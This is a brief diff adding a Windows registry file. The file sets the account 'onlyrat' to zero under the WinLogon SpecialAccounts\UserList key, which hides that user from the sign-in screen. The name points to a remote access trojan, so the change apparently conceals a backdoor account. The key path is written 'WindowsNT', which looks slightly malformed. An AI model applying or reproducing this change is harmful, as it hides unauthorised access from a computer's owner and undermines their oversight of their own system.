@@ -1,0 +1,4 @@
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WindowsNT\CurrentVersion\WinLogon\SpecialAccounts\UserList]
+"onlyrat"=dword:00000000 ;
